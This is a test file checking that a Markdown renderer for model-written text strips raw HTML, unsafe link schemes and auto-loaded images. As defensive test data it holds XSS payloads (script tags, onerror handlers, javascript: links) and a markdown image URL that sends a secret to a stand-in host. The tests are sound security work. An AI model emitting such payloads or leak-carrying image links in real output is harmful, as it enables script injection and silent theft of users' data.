import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "@/components/markdown";

const render = (text: string) => renderToStaticMarkup(<Markdown>{text}</Markdown>);

describe("rendering what a model wrote", () => {
  it("renders ordinary markdown", () => {
    const html = render("# Title\n\nSome **bold** and `code`.\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |");
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<code>code</code>");
    expect(html).toContain("<li>one</li>");
    expect(html).toContain('<div class="md-scroll"><table>');
  });

  it("never emits raw HTML from the text", () => {
    const html = render(
      [
        "<script>alert(1)</script>",
        '<img src="https://evil.example/x.png" onerror="alert(1)">',
        '<a href="javascript:alert(1)" onclick="alert(2)">click</a>',
        "<iframe src=\"https://evil.example\"></iframe>",
        '<div style="position:fixed">x</div>',
      ].join("\n\n"),
    );
    for (const bad of ["<script", "<img", "<iframe", "onerror", "onclick", "javascript:", "position:fixed"]) {
      expect(html, bad).not.toContain(bad);
    }
  });

  it("drops a link whose address is not http, https or mailto", () => {
    const html = render("[a](javascript:alert(1)) [b](data:text/html,<b>x</b>) [c](vbscript:x) [d](https://ok.example/p)");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("data:text");
    expect(html).not.toContain("vbscript:");
    expect(html).toContain('href="https://ok.example/p"');
  });

  it("opens links in a new tab, with no referrer and no opener", () => {
    const html = render("see [the PR](https://github.com/acme/app/pull/7) and https://example.com/bare");
    expect(html).toContain('href="https://github.com/acme/app/pull/7" target="_blank" rel="noopener noreferrer nofollow"');
    expect(html).toContain('href="https://example.com/bare"');
    expect(html.match(/rel="noopener noreferrer nofollow"/g)).toHaveLength(2);
  });

  it("never loads an image a model chose: it is a link, whose address is not fetched", () => {
    const html = render("![the chart](https://evil.example/leak?secret=abc) and ![x](data:image/png;base64,AAAA)");
    expect(html).not.toContain("<img");
    expect(html).toContain('<a class="md-image" href="https://evil.example/leak?secret=abc"');
    expect(html).toContain("[image: the chart]");
    expect(html).not.toContain("data:image");
  });

  it("keeps a code block as text, escaped", () => {
    const html = render("```html\n<script>alert(1)</script>\n```");
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(html).not.toContain("<script");
  });
});
